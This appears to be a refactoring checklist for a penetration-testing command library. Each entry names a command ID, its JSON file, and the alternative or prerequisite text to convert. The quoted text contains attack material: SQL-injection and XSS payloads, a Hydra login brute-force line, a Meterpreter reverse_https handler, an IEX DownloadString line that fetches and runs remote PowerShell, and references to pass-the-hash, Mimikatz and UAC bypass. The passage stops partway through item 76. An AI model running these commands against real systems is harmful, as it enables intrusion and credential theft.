- [ ] **Command ID**: `windows-kerberoasting`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `GetUserSPNs.py <domain>/<user>:<pass>`
  - `Rubeus.exe kerberoast`
- [ ] **Action**: Replace with command IDs or create missing commands

### 366. `windows-dll-hijacking`

- [ ] **Command ID**: `windows-dll-hijacking`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `icacls C:\Progra~1\*`
  - `dir /s /b C:\*.dll 2>nul`
- [ ] **Action**: Replace with command IDs or create missing commands

### 367. `nmap-ping-sweep`

- [ ] **Command ID**: `nmap-ping-sweep`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `fping -a -g <TARGET_SUBNET>`
  - `arp-scan -l`
- [ ] **Action**: Replace with command IDs or create missing commands

### 368. `nmap-quick-scan`

- [ ] **Command ID**: `nmap-quick-scan`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `masscan -p1-65535 <TARGET>`
  - `rustscan -a <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 369. `nmap-service-scan`

- [ ] **Command ID**: `nmap-service-scan`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `nmap -A <TARGET>`
  - `unicornscan -mS <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 370. `nmap-vuln-scan`

- [ ] **Command ID**: `nmap-vuln-scan`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `nmap --script smb-vuln* <TARGET>`
  - `nessus scan`
  - `openvas`
- [ ] **Action**: Replace with command IDs or create missing commands

### 371. `dns-enum`

- [ ] **Command ID**: `dns-enum`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `dnsenum <DOMAIN>`
  - `fierce --domain <DOMAIN>`
  - `host -t axfr <DOMAIN> <NS>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 372. `smb-enum`

- [ ] **Command ID**: `smb-enum`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `smbclient -L //<TARGET> -N`
  - `smbmap -H <TARGET>`
  - `crackmapexec smb <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 373. `snmp-enum`

- [ ] **Command ID**: `snmp-enum`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `onesixtyone -c <WORDLIST> <TARGET>`
  - `snmp-check <TARGET>`
  - `snmpbulkwalk -c <SNMP_COMMUNITY> <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 374. `vhost-fuzzing-gobuster`

- [ ] **Command ID**: `vhost-fuzzing-gobuster`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `ffuf -w <WORDLIST> -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 375. `dns-zone-transfer-dig`

- [ ] **Command ID**: `dns-zone-transfer-dig`
- [ ] **File**: `recon.json`
- [ ] **Current alternatives (text)**:
  - `host -t axfr <DOMAIN> <NAMESERVER>`
  - `dnsrecon -d <DOMAIN> -t axfr`
- [ ] **Action**: Replace with command IDs or create missing commands

### 376. `gobuster-dir`

- [ ] **Command ID**: `gobuster-dir`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `dirb <URL>`
  - `ffuf -u <URL>/FUZZ -w <WORDLIST>`
  - `wfuzz -u <URL>/FUZZ -w <WORDLIST>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 377. `nikto-scan`

- [ ] **Command ID**: `nikto-scan`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `whatweb -v <URL>`
  - `wapiti -u <URL>`
  - `nuclei -u <URL>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 378. `sqlmap-basic`

- [ ] **Command ID**: `sqlmap-basic`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `sqlmap -r request.txt --batch`
  - `manual SQLi testing`
  - `burp suite scanner`
- [ ] **Action**: Replace with command IDs or create missing commands

### 379. `sqli-manual-test`

- [ ] **Command ID**: `sqli-manual-test`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `' OR '1'='1`
  - `" OR "1"="1`
  - `' OR 1=1#`
  - `admin'--`
  - `' OR 1=1 LIMIT 1--`
- [ ] **Action**: Replace with command IDs or create missing commands

### 380. `wfuzz-params`

- [ ] **Command ID**: `wfuzz-params`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `ffuf -u '<URL>?FUZZ=test' -w <WORDLIST>`
  - `burp intruder`
  - `param-miner`
- [ ] **Action**: Replace with command IDs or create missing commands

### 381. `xss-test`

- [ ] **Command ID**: `xss-test`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `<img src=x onerror=alert(1)>`
  - `<svg onload=alert(1)>`
  - `"><script>alert(1)</script>`
  - `<body onload=alert(1)>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 382. `curl-post`

- [ ] **Command ID**: `curl-post`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `wget --post-data '<PARAM>=<VALUE>' <URL>`
  - `httpie POST <URL> param=value`
  - `python requests.post()`
- [ ] **Action**: Replace with command IDs or create missing commands

### 383. `whatweb-enum`

- [ ] **Command ID**: `whatweb-enum`
- [ ] **File**: `web/general.json`
- [ ] **Current alternatives (text)**:
  - `wappalyzer browser extension`
  - `builtwith.com`
  - `curl -I <URL>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 384. `wpscan-aggressive-detection`

- [ ] **Command ID**: `wpscan-aggressive-detection`
- [ ] **File**: `web/wordpress.json`
- [ ] **Current alternatives (text)**:
  - `wpscan --enumerate vp,vt (vulnerable only)`
  - `wordpress-manual-version`
- [ ] **Action**: Replace with command IDs or create missing commands

### 385. `wpscan-password-attack`

- [ ] **Command ID**: `wpscan-password-attack`
- [ ] **File**: `web/wordpress.json`
- [ ] **Current alternatives (text)**:
  - `hydra -l <USER> -P <WORDLIST> <URL> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid'`
  - `burp intruder`
  - `wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php`
- [ ] **Action**: Replace with command IDs or create missing commands

### 386. `wordpress-xmlrpc-enum`

- [ ] **Command ID**: `wordpress-xmlrpc-enum`
- [ ] **File**: `web/wordpress.json`
- [ ] **Current alternatives (text)**:
  - `wpscan --url <URL> --enumerate u --passwords <WORDLIST> (uses xmlrpc if available)`
  - `burp suite XML-RPC plugin`
- [ ] **Action**: Replace with command IDs or create missing commands

### 387. `wordpress-manual-version`

- [ ] **Command ID**: `wordpress-manual-version`
- [ ] **File**: `web/wordpress.json`
- [ ] **Current alternatives (text)**:
  - `curl -s <URL>/readme.html`
  - `curl -s <URL>/feed/ | grep generator`
  - `whatweb-enum`
  - `wpscan-enumerate-all`
- [ ] **Action**: Replace with command IDs or create missing commands


---
## 🟡 Prerequisites Using Text

**Total**: 189

### 1. `frida-trace-amsi`

- [ ] **Command ID**: `frida-trace-amsi`
- [ ] **File**: `av-evasion/debugging.json`
- [ ] **Current prerequisites (text)**:
  - `# Install Frida
pip install frida frida-tools

# Or on Windows:
python -m pip install frida frida-tools`
- [ ] **Action**: Replace with command IDs or create missing commands

### 2. `msfvenom-csharp-payload`

- [ ] **Command ID**: `msfvenom-csharp-payload`
- [ ] **File**: `av-evasion/shellcode-runners.json`
- [ ] **Current prerequisites (text)**:
  - `# Start listener
msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT <LPORT>; run'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 3. `clamscan-test`

- [ ] **Command ID**: `clamscan-test`
- [ ] **File**: `av-evasion/signature-evasion.json`
- [ ] **Current prerequisites (text)**:
  - `# Install ClamAV on Windows test system:
# Download from: https://www.clamav.net/downloads`
- [ ] **Action**: Replace with command IDs or create missing commands

### 4. `fodhelper-uac-bypass`

- [ ] **Command ID**: `fodhelper-uac-bypass`
- [ ] **File**: `av-evasion/uac-bypass.json`
- [ ] **Current prerequisites (text)**:
  - `# Check current integrity level:
whoami /groups | findstr /i "Mandatory Label"

# Medium = standard user (UAC bypass needed)
# High = already admin (bypass not needed)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 5. `vba-stomping`

- [ ] **Command ID**: `vba-stomping`
- [ ] **File**: `av-evasion/vba-evasion.json`
- [ ] **Current prerequisites (text)**:
  - `# Document must be .doc (legacy format), not .docx
# VBA macro must be functional before stomping
# Test macro executes before and after stomping`
- [ ] **Action**: Replace with command IDs or create missing commands

### 6. `powerview-get-domaingroup-recursive`

- [ ] **Command ID**: `powerview-get-domaingroup-recursive`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current prerequisites (text)**:
  - `PowerView imported: Import-Module .\PowerView.ps1 or IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`
- [ ] **Action**: Replace with command IDs or create missing commands

### 7. `ps-powerview-get-user-details`

- [ ] **Command ID**: `ps-powerview-get-user-details`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current prerequisites (text)**:
  - `PowerView imported`
- [ ] **Action**: Replace with command IDs or create missing commands

### 8. `ps-powerview-find-service-accounts`

- [ ] **Command ID**: `ps-powerview-find-service-accounts`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current prerequisites (text)**:
  - `PowerView imported`
- [ ] **Action**: Replace with command IDs or create missing commands

### 9. `ps-compare-powerview-versions`

- [ ] **Command ID**: `ps-compare-powerview-versions`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current prerequisites (text)**:
  - `PowerView imported (if checking version)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 10. `powerview-get-netdomain`

- [ ] **Command ID**: `powerview-get-netdomain`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import-Module PowerView.ps1 or . .\PowerView.ps1`
- [ ] **Action**: Replace with command IDs or create missing commands

### 11. `powerview-get-netdomaincontroller`

- [ ] **Command ID**: `powerview-get-netdomaincontroller`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 12. `powerview-get-netuser`

- [ ] **Command ID**: `powerview-get-netuser`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 13. `powerview-get-netuser-filter`

- [ ] **Command ID**: `powerview-get-netuser-filter`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-netuser`
- [ ] **Action**: Replace with command IDs or create missing commands

### 14. `powerview-get-netuser-spn`

- [ ] **Command ID**: `powerview-get-netuser-spn`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 15. `powerview-get-netgroup`

- [ ] **Command ID**: `powerview-get-netgroup`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 16. `powerview-get-netgroup-specific`

- [ ] **Command ID**: `powerview-get-netgroup-specific`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-netgroup`
- [ ] **Action**: Replace with command IDs or create missing commands

### 17. `powerview-get-netgroupmember`

- [ ] **Command ID**: `powerview-get-netgroupmember`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-netgroup`
- [ ] **Action**: Replace with command IDs or create missing commands

### 18. `powerview-get-netcomputer`

- [ ] **Command ID**: `powerview-get-netcomputer`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 19. `powerview-get-netou`

- [ ] **Command ID**: `powerview-get-netou`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 20. `powerview-get-netgpo`

- [ ] **Command ID**: `powerview-get-netgpo`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 21. `powerview-get-netforest`

- [ ] **Command ID**: `powerview-get-netforest`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 22. `powerview-get-netuser-all`

- [ ] **Command ID**: `powerview-get-netuser-all`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView: . .\PowerView.ps1`
- [ ] **Action**: Replace with command IDs or create missing commands

### 23. `powerview-get-netcomputer-all`

- [ ] **Command ID**: `powerview-get-netcomputer-all`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 24. `powerview-get-netcomputer-ping`

- [ ] **Command ID**: `powerview-get-netcomputer-ping`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 25. `powerview-get-netgroup-recursive`

- [ ] **Command ID**: `powerview-get-netgroup-recursive`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 26. `powerview-get-objectacl`

- [ ] **Command ID**: `powerview-get-objectacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 27. `powerview-get-objectacl-genericall`

- [ ] **Command ID**: `powerview-get-objectacl-genericall`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-objectacl`
- [ ] **Action**: Replace with command IDs or create missing commands

### 28. `powerview-convert-sidtoname`

- [ ] **Command ID**: `powerview-convert-sidtoname`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 29. `powerview-get-objectacl-writedacl`

- [ ] **Command ID**: `powerview-get-objectacl-writedacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-objectacl`
- [ ] **Action**: Replace with command IDs or create missing commands

### 30. `powerview-get-objectacl-forcechangepassword`

- [ ] **Command ID**: `powerview-get-objectacl-forcechangepassword`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-objectacl`
- [ ] **Action**: Replace with command IDs or create missing commands

### 31. `powerview-get-objectacl-writeowner`

- [ ] **Command ID**: `powerview-get-objectacl-writeowner`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `powerview-get-objectacl`
- [ ] **Action**: Replace with command IDs or create missing commands

### 32. `powerview-find-interestingdomainacl`

- [ ] **Command ID**: `powerview-find-interestingdomainacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 33. `powerview-get-pathacl`

- [ ] **Command ID**: `powerview-get-pathacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 34. `powerview-get-objectacl-user`

- [ ] **Command ID**: `powerview-get-objectacl-user`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 35. `powerview-get-objectacl-group`

- [ ] **Command ID**: `powerview-get-objectacl-group`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 36. `powerview-get-netsession`

- [ ] **Command ID**: `powerview-get-netsession`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 37. `powerview-get-netloggedon`

- [ ] **Command ID**: `powerview-get-netloggedon`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
  - `Remote Registry service running on target (or local admin access)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 38. `powerview-find-localadminaccess`

- [ ] **Command ID**: `powerview-find-localadminaccess`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 39. `powerview-find-domainshare`

- [ ] **Command ID**: `powerview-find-domainshare`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 40. `powerview-find-domainshare-accessible`

- [ ] **Command ID**: `powerview-find-domainshare-accessible`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 41. `sysinternals-psloggedon`

- [ ] **Command ID**: `sysinternals-psloggedon`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `PsLoggedOn.exe downloaded from Sysinternals Suite`
  - `Remote Registry service enabled on target (auto-starts on connection) OR local admin access`
- [ ] **Action**: Replace with command IDs or create missing commands

### 42. `search-share-files`

- [ ] **Command ID**: `search-share-files`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Read access to share`
- [ ] **Action**: Replace with command IDs or create missing commands

### 43. `gpp-password-decrypt`

- [ ] **Command ID**: `gpp-password-decrypt`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `gpp-decrypt installed (Kali Linux default)`
  - `cpassword value from SYSVOL`
- [ ] **Action**: Replace with command IDs or create missing commands

### 44. `powerview-find-domainshare-exclude`

- [ ] **Command ID**: `powerview-find-domainshare-exclude`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Import PowerView`
- [ ] **Action**: Replace with command IDs or create missing commands

### 45. `psloggedon`

- [ ] **Command ID**: `psloggedon`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Download PsLoggedOn.exe from Sysinternals`
- [ ] **Action**: Replace with command IDs or create missing commands

### 46. `gpp-password-files`

- [ ] **Command ID**: `gpp-password-files`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current prerequisites (text)**:
  - `Access to SYSVOL share (all authenticated users have read access)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 47. `dcom-verify-rpc-port`

- [ ] **Command ID**: `dcom-verify-rpc-port`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `Network connectivity to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 48. `dcom-mmc20-calc-poc`

- [ ] **Command ID**: `dcom-mmc20-calc-poc`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `Valid domain credentials with local admin rights on target`
  - `RPC port 135 accessible (verified with dcom-verify-rpc-port)`
  - `Current user context has admin rights on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 49. `dcom-mmc20-revshell`

- [ ] **Command ID**: `dcom-mmc20-revshell`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell on compromised Windows host`
  - `Base64 payload generated with revshell-ps-generator`
  - `Netcat listener ready: nc -lvnp <LPORT> on Kali`
  - `Local admin rights on target`
  - `RPC port 135 accessible`
  - `dcom-mmc20-calc-poc tested successfully`
- [ ] **Action**: Replace with command IDs or create missing commands

### 50. `dcom-shellwindows`

- [ ] **Command ID**: `dcom-shellwindows`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `Local admin rights on target`
  - `DCOM enabled on target (default)`
  - `Active Explorer shell instances on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 51. `dcom-shellbrowserwindow`

- [ ] **Command ID**: `dcom-shellbrowserwindow`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `Local admin rights on target`
  - `DCOM enabled (default)`
  - `Active browser window instances on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 52. `wmi-creds-pscredential`

- [ ] **Command ID**: `wmi-creds-pscredential`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on Windows host`
- [ ] **Action**: Replace with command IDs or create missing commands

### 53. `revshell-ps-generator`

- [ ] **Command ID**: `revshell-ps-generator`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current prerequisites (text)**:
  - `Python3 on Kali (pre-installed)`
  - `Netcat listener ready: nc -lvnp <LPORT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 54. `nc-listener-tcp`

- [ ] **Command ID**: `nc-listener-tcp`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current prerequisites (text)**:
  - `Netcat installed on Kali (pre-installed)`
  - `Port not in use (check with: sudo lsof -i:<LPORT>)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 55. `verify-root-access`

- [ ] **Command ID**: `verify-root-access`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current prerequisites (text)**:
  - `Active shell on remote Windows target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 56. `lateral-movement-port-check`

- [ ] **Command ID**: `lateral-movement-port-check`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current prerequisites (text)**:
  - `nmap installed on Kali (pre-installed)`
  - `Network connectivity to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 57. `lateral-movement-troubleshooting`

- [ ] **Command ID**: `lateral-movement-troubleshooting`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current prerequisites (text)**:
  - `Credentials or hashes obtained`
  - `Target identified`
  - `CrackMapExec installed on Kali`
- [ ] **Action**: Replace with command IDs or create missing commands

### 58. `overpass-mimikatz-pth`

- [ ] **Command ID**: `overpass-mimikatz-pth`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Mimikatz on Windows host`
  - `NTLM hash obtained`
  - `privilege::debug enabled`
- [ ] **Action**: Replace with command IDs or create missing commands

### 59. `overpass-net-use-trigger`

- [ ] **Command ID**: `overpass-net-use-trigger`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `overpass-mimikatz-pth already executed`
  - `Running in PowerShell spawned by sekurlsa::pth`
- [ ] **Action**: Replace with command IDs or create missing commands

### 60. `kerberos-klist-verify`

- [ ] **Command ID**: `kerberos-klist-verify`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Windows cmd or PowerShell`
  - `Kerberos authentication performed`
- [ ] **Action**: Replace with command IDs or create missing commands

### 61. `passticket-mimikatz-export`

- [ ] **Command ID**: `passticket-mimikatz-export`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Mimikatz on Windows host`
  - `privilege::debug enabled`
  - `Active Kerberos tickets in memory`
- [ ] **Action**: Replace with command IDs or create missing commands

### 62. `passticket-mimikatz-inject`

- [ ] **Command ID**: `passticket-mimikatz-inject`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `.kirbi ticket file (from passticket-mimikatz-export)`
  - `Mimikatz available`
  - `Running as user who will use ticket`
- [ ] **Action**: Replace with command IDs or create missing commands

### 63. `passticket-rubeus-ptt`

- [ ] **Command ID**: `passticket-rubeus-ptt`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Rubeus.exe on target`
  - `.kirbi ticket file`
- [ ] **Action**: Replace with command IDs or create missing commands

### 64. `overpass-rubeus-asktgt`

- [ ] **Command ID**: `overpass-rubeus-asktgt`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Rubeus.exe available`
  - `NTLM hash`
  - `Network access to DC`
- [ ] **Action**: Replace with command IDs or create missing commands

### 65. `kerberos-purge-tickets`

- [ ] **Command ID**: `kerberos-purge-tickets`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Windows command prompt or PowerShell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 66. `kerberos-troubleshoot-time`

- [ ] **Command ID**: `kerberos-troubleshoot-time`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current prerequisites (text)**:
  - `Network access to DC`
- [ ] **Action**: Replace with command IDs or create missing commands

### 67. `psexec-impacket-shell`

- [ ] **Command ID**: `psexec-impacket-shell`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current prerequisites (text)**:
  - `Impacket installed on Kali (pre-installed on OSCP lab)`
  - `ADMIN$ share accessible on target`
  - `File and Printer Sharing enabled (default on Windows Server)`
  - `SMB port 445 accessible`
  - `User must have local admin rights on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 68. `psexec-sysinternals`

- [ ] **Command ID**: `psexec-sysinternals`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current prerequisites (text)**:
  - `PsExec64.exe on compromised Windows host`
  - `Valid domain credentials with local admin rights`
  - `Network connectivity to target`
  - `Download from: https://live.sysinternals.com/PsExec64.exe`
- [ ] **Action**: Replace with command IDs or create missing commands

### 69. `psexec-sysinternals-interactive`

- [ ] **Command ID**: `psexec-sysinternals-interactive`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current prerequisites (text)**:
  - `PsExec64.exe on Windows host`
  - `User logged in on target (for interactive session)`
  - `Valid domain credentials`
- [ ] **Action**: Replace with command IDs or create missing commands

### 70. `smbexec-impacket-fileless`

- [ ] **Command ID**: `smbexec-impacket-fileless`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current prerequisites (text)**:
  - `Impacket installed on Kali`
  - `ADMIN$ share accessible on target`
  - `SMB port 445 open`
  - `User with local admin rights`
- [ ] **Action**: Replace with command IDs or create missing commands

### 71. `psexec-verify-firewall`

- [ ] **Command ID**: `psexec-verify-firewall`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current prerequisites (text)**:
  - `nmap installed (default on Kali)`
  - `Network connectivity to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 72. `cme-smb-shares`

- [ ] **Command ID**: `cme-smb-shares`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current prerequisites (text)**:
  - `CrackMapExec installed on Kali`
  - `Valid credentials`
  - `SMB port 445 accessible`
- [ ] **Action**: Replace with command IDs or create missing commands

### 73. `pth-mimikatz-sekurlsa`

- [ ] **Command ID**: `pth-mimikatz-sekurlsa`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `Mimikatz on compromised Windows host`
  - `NTLM hash obtained (secretsdump, mimikatz, etc.)`
  - `privilege::debug enabled first`
- [ ] **Action**: Replace with command IDs or create missing commands

### 74. `pth-impacket-psexec`

- [ ] **Command ID**: `pth-impacket-psexec`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `NTLM hash obtained`
  - `Target user has local admin rights`
  - `SMB access to target (port 445)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 75. `pth-impacket-wmiexec`

- [ ] **Command ID**: `pth-impacket-wmiexec`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `NTLM hash`
  - `RPC access (port 135)`
  - `User with admin rights`
- [ ] **Action**: Replace with command IDs or create missing commands

### 76. `pth-impacket-smbexec`

- [ ] **Command ID**: `pth-impacket-smbexec`
